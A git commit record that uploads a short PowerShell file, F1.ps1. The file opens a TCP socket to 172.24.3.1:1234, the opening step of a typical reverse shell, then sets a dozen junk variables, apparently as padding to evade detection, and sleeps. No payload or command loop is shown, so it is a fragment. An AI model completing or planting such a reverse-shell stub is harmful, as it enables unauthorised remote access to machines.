f89a188ec59caf0dcd3c234d586a8365b84035ae
Sekhar449 <155005656+Sekhar449@users.noreply.github.com>
2024-05-27 12:08:23 +0530

    Add files via upload

---
+++ F1.ps1
@@ -0,0 +1,16 @@
+$ttttttt = New-Object System.Net.Sockets.TCPClient("172.24.3.1", 1234)
+$enwwwv2= "aweaae"
+$enwwwv1= "aweaae"
+$enwwwv3= "aweaae"
+$enwwwv4= "aweaae"
+$enwwwv5= "aweaae"
+$enwwwv6= "aweaae"
+$enwwwv7= "aweaae"
+$enwwwv8= "aweaae"
+$enwwwv11= "aweaae"
+$enwwwv111= "aweaae"
+$enwwwv0= "aweaae"
+$enwwwv12= "aweaae"
+$enwwwv122= "aweaae"
+
+Start-Sleep -s 5;
